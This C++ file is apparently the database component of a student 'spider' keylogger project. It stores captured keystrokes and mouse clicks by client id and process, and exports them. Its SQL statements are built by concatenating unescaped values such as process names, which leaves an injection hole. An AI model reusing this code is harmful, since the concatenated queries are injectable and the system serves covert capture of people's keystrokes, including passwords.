//
// Database.cpp for Database in /home/guesti_a/Bureau/Tek3/cpp_spider/sql
//
// Made by Guestin Antoine
// Login   <guesti_a@epitech.net>
//
// Started on  Thu Oct  5 16:45:19 2017 Guestin Antoine
// Last update Tue Oct 10 00:05:14 2017 nicolas
//

#include	<iostream>
#include	<fstream>
#include	<log.hpp>
#include	"sql/Database.hpp"

Database::Database()
{
  this->mysql.MysqlOptions(MYSQL_READ_DEFAULT_GROUP,"option");
}

bool		Database::connect()
{
  this->DbName = "Spider";
  if (!(this->mysql.MysqlRealConnect(this->DbName.c_str())))
    {
      if (!this->mysql.MysqlConnect())
	return (false);
      this->mysql.MysqlQuery("USE "+ this->DbName + ";");
    }
  return (true);
}

bool		Database::createEntry(std::string &str)
{
  this->DbName = str;
  if (!(this->mysql.MysqlRealConnect(this->DbName.c_str())))
    {
      std::cout << "[DATABASE] " << this->DbName << " doesn't exist" << std::endl;
      if (!this->mysql.MysqlConnect())
	{
	  std::cout << "[DATABASE] " << this->DbName << " failed" << std::endl;
	  return (false);
	}
      else
	{
	  this->mysql.MysqlQuery("DROP DATABASE " + this->DbName + ";");
	  this->mysql.MysqlQuery("CREATE DATABASE " + this->DbName + ";");
	  this->mysql.MysqlQuery("USE "+ this->DbName + ";");
	  std::cout << "[DATABASE] " << this->DbName << " created" << std::endl;
	}
    }
  if (this->mysql.MysqlQuery("CREATE TABLE `Keyboard` ("
			     "`Id` bigint NOT NULL,"
			     "`Key` varchar(32),"
			     "`Process` varchar(32) NOT NULL,"
			     "`SpecialKey` tinyint NOT NULL,"
			     "`Time` bigint NOT NULL"
			     ");") == 0)
    std::cout << "[DATABASE] Keyboard created" << std::endl;
  else
    std::cout << "[DATABASE] Keyboard already exists" << std::endl;
  if (this->mysql.MysqlQuery("CREATE TABLE `Mouse` ("
			     "`Id` bigint NOT NULL,"
			     "`X` smallint NOT NULL,"
			     "`Y` smallint NOT NULL,"
			     "`ClickType` varchar(32) NOT NULL,"
			     "`Process` varchar(32) NOT NULL,"
			     "`Time` bigint NOT NULL"
			     ");") == 0)
    std::cout << "[DATABASE] Mouse created" << std::endl;
  else
    std::cout << "[DATABASE] Mouse already exists" << std::endl;
  return (true);
}

bool		Database::store(struct s_input &data, const unsigned int &id, std::map<unsigned char, std::string> &vkCodesMap)
{
  if (data.posX == -1)
    {
      this->mysql.MysqlQuery(std::string("INSERT INTO Keyboard VALUES ("
					 + std::to_string(id) + ", " + "\"" + vkCodesMap[data.inputCode] + "\"" + ", "
					 + "\"" + data.process + "\"" + ", " + std::to_string(data.specialKey) + ", " + std::to_string(data.timestamp) + ");"));
    }
  else
    {
      this->mysql.MysqlQuery(std::string("INSERT INTO Mouse VALUES ("
					 + std::to_string(id) + ", " + std::to_string(data.posX) + ", "
					 + std::to_string(data.posY) + ", " + "\"" + vkCodesMap[data.inputCode] + "\"" + 
					 + ", " + "\"" + data.process + "\"" + ", " + std::to_string(data.timestamp) + ");"));
    }
  return (true);
}

bool		Database::exportDb(std::string Query, std::string Filename)
{
  unsigned int	i = 0;
  MYSQL_RES	*result = NULL;
  MYSQL_ROW	row;
  unsigned int	num_champs = 0;
  std::ofstream	outputFile;

  outputFile.open(Filename, std::ofstream::out | std::ofstream::app);
  if (!outputFile.is_open())
    {
      std::cerr << "[ERROR] Invalid file" << std::endl;
      return (false);
    }
  this->mysql.MysqlQuery(Query);
  result = this->mysql.MysqlUseResult();
  num_champs = this->mysql.MysqlNumFields(result);
  std::cout << "[Database] Export begin" << std::endl;
  while ((row = this->mysql.MysqlFetchRow(result)))
    {
      i = 0;
      while (i < num_champs)
	{
	  outputFile << "[" << (row[i] ? row[i] : "NULL") << "]\t";
	  i++;
	}
      outputFile << std::endl;
    }
  this->mysql.MysqlFreeResult(result);
  outputFile.close();
  return (true);
}

bool		Database::expor(std::string Filename)
{
  exportDb(std::string("Select * FROM Keyboard ORDER BY Time;"), Filename + "_Keyboard");
  exportDb(std::string("Select * FROM Mouse ORDER BY Time;"), Filename + "_Mouse");
  return (true);
}

bool		Database::expor(std::string Filename, unsigned int id)
{
  exportDb(std::string("SELECT * FROM Mouse WHERE id =") + std::to_string(id) + " ORDER BY Time;", Filename + "_Keyboard");
  exportDb(std::string("SELECT * FROM Keyboard WHERE id =") + std::to_string(id) + " ORDER BY Time;", Filename + "_Mouse");
  return (true);
}

bool		Database::expor(std::string Filename, unsigned int id, std::string process)
{
  exportDb(std::string("SELECT * FROM Mouse WHERE id =") + std::to_string(id) + " AND PROCESS = '"+ process + "' ORDER BY Time;", Filename);
  exportDb(std::string("SELECT * FROM Keyboard WHERE id =") + std::to_string(id) + " AND PROCESS = '"+ process + "' ORDER BY Time;", Filename);
  return (true);
}
